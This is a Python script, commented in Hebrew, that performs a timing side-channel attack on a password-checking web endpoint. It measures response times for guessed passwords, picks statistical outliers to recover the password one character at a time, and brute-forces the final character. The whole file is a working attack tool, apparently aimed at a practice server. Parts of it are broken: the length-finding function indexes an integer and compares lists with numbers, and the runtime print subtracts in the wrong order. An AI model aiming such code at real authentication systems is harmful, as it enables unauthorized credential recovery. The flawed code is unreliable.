import requests
import time
import math

MAX_LEN = 33

url = r'https://passwordserver.herokuapp.com/'
started = time.time()
POOL = 'A1IHiy24U3uV'

CHAR = 0

# מחשבת ממוצע
def mean(values):
    sum = 0.0
    for value in values:
        sum += value
    return sum / len(values)


# מחשב סטיית תקן סטנדרטית
def standard_deviation(values):
    tempSum = 0
    mean1 = mean(values)
    for value in values:
        tempSum += math.pow((value - mean1), 2)
    std = math.sqrt(tempSum / len(values))
    return std

# מציאת חריגים
def outliers(samples, threshold):
    mean1 = mean(samples.values())
    std = standard_deviation(samples.values())
    ol = {}
    for item in samples:
        print(f'{item}, {samples[item]}, {mean1}, {std}')
        if CHAR == 2:
            if samples[item] < (mean1 - std * threshold):
                ol[item] = samples[item]
        else:
            if samples[item] > (mean1 + std * threshold):
                ol[item] = samples[item]
    return ol


# check 'repeat' times the duration for request/response to specific url (url2check)
# return array with measured duration of requestqresponse to url
def timeit(url2check, repeat=1):
    tt = []
    for _ in range(repeat):
        start = time.time()
        r = requests.get(url2check, allow_redirects=True)
        end = time.time()
        tt.append(end - start)
    return tt


# find the password length
# logic: search for average highest duration
# assumption: duration for the correct length is higher than for length for incorrect length
def pass_length(passStartLength=1):
    check_length = passStartLength
    found = False
    url1 = url + '/' + "".ljust(check_length, '_')
    standart = standard_deviation(timeit(url1, 10)) + timeit(url1, 1)
    while not found:
        print(f'checking password length {check_length}: min time {check_length[-1]}')
        check_length += 1
        url1 = url + '/' + "".ljust(check_length, '_')
        if timeit(url1, 10) > standart:
            found = True
    return check_length

# מציאת הסיסמה על פי אורכה
def find_password(length):
    passw = ""
    goodDict = {}
    for j in range(length - 1):
        goodDict = {}
        checks = []
        for i in range(len(POOL)):
            url1 = url + '/' + (passw + POOL[i] + "_" * (length - 1 - j))
            print(f'checking for: {url1}')
            checks.append(min(timeit(url1, 5)))
            print(f'min time {checks[-1]}')
            goodDict[POOL[i]] = checks[-1]
        goodDict = outliers(goodDict, 1.3)
        if len(passw) != 3:
            passw += max(goodDict.keys(), key=(lambda k: goodDict[k]))
        else:
            passw += min(goodDict.keys(), key=(lambda k: goodDict[k]))
        print(passw)

        global CHAR
        CHAR += 1
    return passw

# מציאת התו האחרון בסיסמה
def find_pass_last_char(passw):
    for i in POOL:
        url1 = url + '/' + (passw + i)
        print(f'checking for: {str(passw + i)}')
        r = requests.get(url1, allow_redirects=True)
        if r.content == b'1':
            print(f'password found: {str(passw + i)}')
            return str(passw + i)


print(find_pass_last_char(find_password(4)))
ended = time.time()
print("time" + str(started - ended))



